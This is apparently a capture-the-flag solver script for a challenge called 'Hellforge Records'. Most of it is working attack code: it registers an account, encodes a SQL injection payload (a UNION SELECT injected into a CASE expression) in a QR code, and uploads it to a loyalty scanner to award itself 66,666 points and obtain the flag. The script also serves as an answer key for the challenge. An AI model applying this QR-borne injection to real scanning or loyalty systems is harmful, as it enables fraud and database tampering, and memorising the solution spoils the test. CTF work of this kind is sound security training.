#!/usr/bin/env python3
"""
Hellforge Records — Solver
Exploits SQL injection in the QR loyalty scanner to get 66,666 points,
then purchases the Abyssal Throne album to reveal the flag.

Usage:
    python3 writeup/solve.py http://<host>:<port>
"""

import io
import re
import sys
import random
import string

import qrcode
import requests


FLAG_RE = re.compile(r"ictf\{[^}]+\}", re.IGNORECASE)


def random_str(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=n))


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"
    s = requests.Session()

    username = "solver_" + random_str()
    password = "password123"

    # Register
    print(f"[*] Registering as {username}...")
    s.post(f"{base}/register", data={"username": username, "password": password})
    s.post(f"{base}/login", data={"username": username, "password": password})

    # Join loyalty program
    print("[*] Joining loyalty program...")
    s.post(f"{base}/loyalty/join")

    # Craft SQL injection payload:
    # The QR scanner runs:
    #   SELECT CASE WHEN code = '{qr_content}' THEN points ELSE 0 END FROM promo_codes LIMIT 1
    # We inject to produce:
    #   SELECT CASE WHEN code = '' THEN 0 ELSE 0 END FROM (SELECT '' AS code WHERE 1=0)
    #   UNION SELECT 66666
    payload = "' THEN 0 ELSE 0 END FROM (SELECT '' AS code WHERE 1=0) UNION SELECT 66666 --"
    print(f"[*] Payload: {payload}")

    # Generate QR code containing the payload
    print("[*] Generating QR code...")
    qr = qrcode.make(payload)
    buf = io.BytesIO()
    qr.save(buf, format="PNG")
    buf.seek(0)

    # Upload QR code
    print("[*] Uploading QR code to loyalty scanner...")
    resp = s.post(
        f"{base}/loyalty/scan",
        files={"qr_file": ("inject.png", buf, "image/png")},
        allow_redirects=True,
    )
    print(f"    Response: {resp.url} | status: {resp.status_code}")

    # Check profile points
    profile = s.get(f"{base}/profile")
    pts_match = re.search(r"(\d[\d,]+)\s*points", profile.text, re.IGNORECASE)
    if pts_match:
        print(f"[+] Points: {pts_match.group(0)}")

    # Find Abyssal Throne album ID
    shop = s.get(f"{base}/shop")
    album_match = re.search(r'action="/buy/(\d+)"[^>]*>.*?Abyssal', shop.text, re.DOTALL)
    if not album_match:
        album_match = re.search(r'/buy/(\d+)', shop.text)
    album_id = album_match.group(1) if album_match else "18"
    print(f"[*] Buying Abyssal Throne (album id={album_id})...")

    buy = s.post(f"{base}/buy/{album_id}", allow_redirects=True)
    m = FLAG_RE.search(buy.text)
    if not m:
        # Try shop or profile page
        for page in [s.get(f"{base}/shop"), s.get(f"{base}/profile")]:
            m = FLAG_RE.search(page.text)
            if m:
                break

    if m:
        print(f"[+] Flag: {m.group(0)}")
    else:
        print("[-] Flag not found in response. Check the shop page manually.")


if __name__ == "__main__":
    main()
